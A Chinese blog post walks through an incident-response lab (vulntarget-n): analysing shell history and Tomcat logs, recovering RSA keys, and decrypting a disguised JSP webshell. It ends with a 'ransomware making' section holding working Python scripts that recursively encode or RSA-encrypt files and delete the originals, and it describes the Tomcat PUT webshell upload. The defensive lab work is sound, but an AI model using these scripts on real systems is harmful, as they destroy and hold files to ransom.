
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/maxwellf/p/18763996" title="发布于 2025-03-10 23:32">
    <span role="heading" aria-level="2">应急响应靶场之vulntarget-n</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="vulntarget-n">vulntarget-n</h1>
<p>用户名密码：root/Vulntarget@123</p>
<h2 id="一分析history命令">一.分析history命令</h2>
<p>1.先将历史命令导出</p>
<p>history &gt; 1.txt</p>
<p>2.分析history</p>
<p>1）篡改网页</p>
<p><img src="https://img2023.cnblogs.com/blog/2990134/202503/2990134-20250310232948515-1261493250.png" alt="image-20250310215606305" loading="lazy"></p>
<p>2）将木马文件进行伪装</p>
<p><img src="https://img2023.cnblogs.com/blog/2990134/202503/2990134-20250310232948982-495015119.png" alt="image-20250310215658519" loading="lazy"></p>
<p>3）创建公钥私钥，加密方式为rsa</p>
<p><img src="https://img2023.cnblogs.com/blog/2990134/202503/2990134-20250310232949718-690378246.png" alt="image-20250310223026736" loading="lazy"></p>
<p>4）拷贝公钥到指定目录，将该目录下文件进行勒索加密</p>
<p><img src="https://img2023.cnblogs.com/blog/2990134/202503/2990134-20250310232950358-580697171.png" alt="image-20250310220008645" loading="lazy"></p>
<h2 id="二找到加密私钥进行解密">二.找到加密私钥进行解密</h2>
<pre><code>find . -name *key*.pem     #在根目录下全局搜索公钥
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/2990134/202503/2990134-20250310232950789-23031001.png" alt="image-20250310153539272" loading="lazy"></p>
<p>将公钥私钥以及加密文件内容放到rsa解密</p>
<p><img src="https://img2023.cnblogs.com/blog/2990134/202503/2990134-20250310232951289-2112605566.png" alt="image-20250310154250076" loading="lazy"></p>
<p>注，将404.jsp文件进行解密后发现文件为jsp马。</p>
<h2 id="三检查日志">三.检查日志</h2>
<p>1.tomcat日志文件路径存放于 /opt/tomcat/logs</p>
<p><img src="https://img2023.cnblogs.com/blog/2990134/202503/2990134-20250310232951789-2077582150.png" alt="image-20250310221357084" loading="lazy"></p>
<pre><code>由于攻击行为可能存在上传木马行为，重点查看post、put请求下，状态码为200的请求内容。

tail -n 5000 localhost_access_log.2024-06-04.txt | grep "2*" | grep "PUT"
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/2990134/202503/2990134-20250310232952141-457440590.png" alt="image-20250310220400488" loading="lazy"></p>
<p>上传jsp马后，执行了whoami</p>
<p><img src="https://img2023.cnblogs.com/blog/2990134/202503/2990134-20250310232952608-1645400397.png" alt="image-20250310230853414" loading="lazy"></p>
<h2 id="4漏洞复现">4.漏洞复现</h2>
<p>复习一下tomcat文件上传漏洞</p>
<p>put请求下上传一个jsp小马，使用蚁剑连接。</p>
<h2 id="5攻击过程">5.攻击过程</h2>
<p>1.利用tomcat历史漏洞（文件上传漏洞）上传vulntarget.jsp马。</p>
<p>2.反弹shell拿到root权限。</p>
<p>3.将jsp马伪装成404.jsp文件。</p>
<p>4.创建勒索文件，使用rsa加密，生成公钥私钥。</p>
<p>5.使用python，对ROOT路径下的文件进行rsa加密。</p>
<p>6.删除加密脚本，做痕迹清除。</p>
<h2 id="其他">其他</h2>
<h3 id="1了解重要配置文件">1.了解重要配置文件</h3>
<p>/opt/tomcat/conf/server.xml     #该文件为tomcat配置文件，可以实现更改端口，设置虚拟主机，配置SSL等</p>
<h3 id="2勒索文件制作">2.勒索文件制作</h3>
<h4 id="1制作公钥私钥">1.制作公钥私钥</h4>
<p>mkdir keys    #创建一个文件夹，用于存放公钥私钥。</p>
<p>vim get_pem.py   #编写公钥私钥生成脚本</p>
<p>python3 get_pem.py  #运行脚本，生成公私钥</p>
<p>常见生成公私钥脚本如下：</p>
<pre><code>import rsa
import os

# 确保 keys 文件夹存在
os.makedirs("./keys", exist_ok=True)

# 生成 RSA 密钥对
pub, priv = rsa.newkeys(2048)  # 建议使用 2048 位密钥

# 保存公钥
try:
    pub = pub.save_pkcs1()
    with open("./keys/pubkey.pem", mode="wb") as file:
        file.write(pub)
    print("公钥保存成功：./keys/pubkey.pem")
except Exception as e:
    print(f"保存公钥时出错：{e}")

# 保存私钥
try:
    priv = priv.save_pkcs1()
    with open("./keys/privkey.pem", mode="wb") as file:
        file.write(priv)
    print("私钥保存成功：./keys/privkey.pem")
except Exception as e:
    print(f"保存私钥时出错：{e}")
</code></pre>
<h4 id="2准备加密工作">2.准备加密工作</h4>
<p>cp keys/pubkey.pem /opt/tomcat/webapps/ROOT    #将公钥放到网页webapps目录下</p>
<p>vim flag.jsp   #创建flag.jsp文件</p>
<p>vim encrypt_vulntarget.py   #创建加密脚本，对当前目录下的jsp文件都进行加密</p>
<p>常见加密脚本如下：</p>
<pre><code>##获取文件路径
def list(src):
    res = []
    for root, dirs, files in os.walk(src): #获取父目录，子目录，文件
        for file in files:
            # 获取文件所属目录
            # print(root)
            # 获取文件路径
            res.append(os.path.join(root, file)) #把父目录和文件合成一个路径
    return res
    
## 加密
def ran_encode(res):
    for r in res:
        # print(re)
        with open(r, 'rb') as fp:
            src = fp.read()
        bs = base64.b64encode(src).decode()   #读取并用base64加密
        se = ''
        for b in bs:
            new = chr(ord(b) + 5)   #转换成acsii码进行位移
            se += new
        # print(type(re))
        os.remove(r)
        name = '123'
        with open(r+name, 'wb') as fp:   #覆写
            fp.write(se.encode())
            
            
## 解密
def ran_decode(res):
    for r in res:
        with open(r, 'r') as fp:
            src = fp.read()
        se = ''
        for b in src:
            new = chr(ord(b) - 5)
            se += new
        resp = base64.b64decode(se)
        s=r[0:-3]
        os.remove(r)
        with open(s,'wb') as fp:
            fp.write(resp)
path=r"需要勒索的目录，绝对路径"
def intes():
    res=list(path)
    ran_encode(res)
def outs():
    src1 = list(path)
    ran_decode(src1)
</code></pre>
<p>加解密常见脚本</p>
<pre><code>##加密
def encrypt_file(file_path, public_key_path):
    # 加载公钥
    with open(public_key_path, "rb") as f:
        public_key = rsa.PublicKey.load_pkcs1(f.read())

    # 读取文件内容
    with open(file_path, "rb") as f:
        file_content = f.read()

    # 加密文件内容
    encrypted_content = rsa.encrypt(file_content, public_key)

    # 保存加密后的文件
    encrypted_file_path = file_path + ".enc"
    with open(encrypted_file_path, "wb") as f:
        f.write(encrypted_content)

    print(f"文件已加密并保存到 {encrypted_file_path}")
    return encrypted_file_path

# 示例：加密文件
encrypt_file("example.txt", "public_key.pem")

##解密
def decrypt_file(encrypted_file_path, private_key_path):
    # 加载私钥
    with open(private_key_path, "rb") as f:
        private_key = rsa.PrivateKey.load_pkcs1(f.read())

    # 读取加密后的文件内容
    with open(encrypted_file_path, "rb") as f:
        encrypted_content = f.read()

    # 解密文件内容
    decrypted_content = rsa.decrypt(encrypted_content, private_key)

    # 保存解密后的文件
    decrypted_file_path = encrypted_file_path.replace(".enc", "_decrypted")
    with open(decrypted_file_path, "wb") as f:
        f.write(decrypted_content)

    print(f"文件已解密并保存到 {decrypted_file_path}")

# 示例：解密文件
decrypt_file("example.txt.enc", "private_key.pem")
</code></pre>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.03140107776041667" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-10 23:32">2025-03-10 23:32</span>&nbsp;
<a href="https://www.cnblogs.com/maxwellf">麦克斯韦方</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18763996" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18763996);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18763996', targetLink: 'https://www.cnblogs.com/maxwellf/p/18763996', title: '应急响应靶场之vulntarget-n' })">举报</a>
</div>
        